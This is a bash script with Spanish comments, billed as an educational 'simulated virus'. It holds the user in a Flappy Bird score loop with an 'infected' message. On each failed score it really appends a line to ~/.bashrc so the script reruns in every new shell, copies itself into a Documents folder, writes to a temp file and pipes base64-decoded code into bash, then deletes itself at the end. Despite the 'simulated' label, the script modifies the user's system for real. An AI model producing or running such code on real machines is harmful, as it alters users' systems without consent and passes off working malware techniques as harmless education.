#!/bin/bash
# virus.sh - Simulación de virus que lanza múltiples instancias de Flappy Bird y funcionalidades simuladas
# ADVERTENCIA: Este código es 100% educativo. Ejecútalo en entornos controlados.
#
# Funcionalidades:
# 1. Lanzamiento del juego Flappy Bird simulado en el navegador.
# 2. Validación de puntuación: el usuario debe ingresar una puntuación >= 20 para salir.
# 3. Payload Simulado: Inunda un archivo temporal con texto aleatorio.
# 4. Propagación Simulada: Copia el script a otra carpeta.
# 5. Persistencia Simulada: Agrega una entrada a ~/.bashrc.
# 6. Ofuscación: Ejecuta un código ofuscado en Base64.
# 7. Autodestrucción: Elimina el script tras su ejecución.

# Función para abrir flappy.html en el navegador predeterminado
lanzar_flappy() {
  if command -v xdg-open > /dev/null; then
    xdg-open flappy.html
  elif command -v open > /dev/null; then
    open flappy.html
  else
    echo "No se pudo abrir el navegador automáticamente."
  fi
}

# Función de Payload Simulado: Inunda /tmp/infectado.txt con texto aleatorio
payload_simulado() {
  archivo="/tmp/infectado.txt"
  touch "$archivo"  # Crea el archivo si no existe
  echo "Iniciando inundación de $archivo..."
  for i in {1..10}; do
    echo "Línea aleatoria: $RANDOM" >> "$archivo"
    sleep 0.1
  done
  echo "Inundación temporal completada."
}

# Función de Propagación Simulada: Copia este script a $HOME/Documents/Infectados
propagacion_simulada() {
  destino="$HOME/Documents/Infectados"
  mkdir -p "$destino"  # Crea el directorio si no existe
  cp "$0" "$destino/virus_$(date +%s).sh"  # Copia el script con un nombre único
  echo "Script propagado a $destino."
}

# Función de Persistencia Simulada: Agrega una entrada a ~/.bashrc
persistencia_simulada() {
  entrada="bash $(pwd)/$(basename "$0") # Persistencia del virus simulado"
  if ! grep -qF "$entrada" "$HOME/.bashrc"; then
    echo "$entrada" >> "$HOME/.bashrc"
    echo "Entrada de persistencia agregada a ~/.bashrc."
  else
    echo "La entrada de persistencia ya existe en ~/.bashrc."
  fi
}

# Función de Ofuscación: Ejecuta un código ofuscado en Base64
ofuscacion_simulada() {
  codigo_original='echo "Ejecutando código ofuscado simulado"'
  codigo_ofuscado=$(echo "$codigo_original" | base64)
  # Decodifica y ejecuta el código ofuscado
  echo "$codigo_ofuscado" | base64 --decode | bash
}

# Función de Autodestrucción: Elimina este script después de ejecutarse
autodestruccion() {
  echo "El script se autodestruirá en 3 segundos..."
  sleep 3
  rm -- "$0" 2>/dev/null && echo "Script eliminado." || echo "No se pudo eliminar el script."
}

# Mensaje inicial
echo "¡Tu sistema está infectado! 😈"
sleep 2

# Bucle principal: el usuario debe ingresar una puntuación de al menos 20 para salir.
while true; do
  lanzar_flappy
  echo "Juega al Flappy Bird simulado. Debes alcanzar una puntuación mínima de 20 para poder salir."
  read -p "Ingresa tu puntuación: " score
  
  if [[ "$score" =~ ^[0-9]+$ ]] && [ "$score" -ge 20 ]; then
    echo "¡Felicidades! Has alcanzado la puntuación necesaria. Saliendo..."
    break
  else
    echo "Puntuación insuficiente. Ejecutando funciones adicionales..."
    payload_simulado
    propagacion_simulada
    persistencia_simulada
    ofuscacion_simulada
    sleep 1
  fi
done

# Al finalizar, se ejecuta la autodestrucción
autodestruccion
